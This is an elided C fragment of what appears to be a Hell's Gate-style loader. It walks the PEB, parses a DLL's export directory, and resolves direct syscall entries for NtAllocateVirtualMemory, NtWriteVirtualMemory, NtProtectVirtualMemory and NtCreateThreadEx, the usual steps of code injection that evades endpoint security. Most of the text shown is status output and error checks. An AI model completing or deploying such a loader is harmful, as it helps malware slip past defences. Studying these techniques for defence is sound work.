...
int main(int argc, char* argv[])
{
	...
	{
		PRINTA("[!] Error finding %ls in memory\n", TargetDLL);
		EXITA(-1);
	}

	//output
	PRINTA("[+] Found PEB at %p\n", pPeb);
	PRINTA("\t[*] Found PEB_LDR_DATA struct at %p\n", pLdr);
	PRINTA("\t[*] Found head of InMemoryOrderModuleList at %p\n", pHeadNode);
	...
	{
		PRINTA("[!] Error with casting to IMAGE_DOS_HEADER\n");
		EXITA(-1);
	}
	...
	{
		PRINTA("[!] Error with getting NT HEADER struct\n");
		EXITA(-1);
	}
	...
	//output
	PRINTA("[+] Parsing dll for function addresses\n");
	PRINTA("\t[*] Successfully parsed DOS header at address %p\n", pDosHeader);
	PRINTA("\t[*] Successfully parsed NT header at address %p\n", pNtHeader);
	PRINTA("\t[*] Successfully parsed the export directory at address %p\n", pImgExportDir);
	PRINTA("\t[*] Successfully retrieved function names, addresses and ordinals\n");
	...
	{
		PRINTA("[!] Error with GetVxTableEntry for NtAllocateVirtualMemory...\n");
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtCreateThreadEx))
	{
		PRINTA("[!] Error with GetVxTableEntry for NtCreateThreadEx...\n");
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWriteVirtualMemory))
	{
		PRINTA("[!] Error with GetVxTableEntry for NtWriteVirtualMemory...\n");
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtProtectVirtualMemory))
	{
		PRINTA("[!] Error with GetVxTableEntry for NtProtectVirtualMemory...\n");
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWaitForSingleObject))
	{
		PRINTA("[!] Error with GetVxTableEntry for NtWaitForSingleObject...\n");
		EXITA(-1);
	}
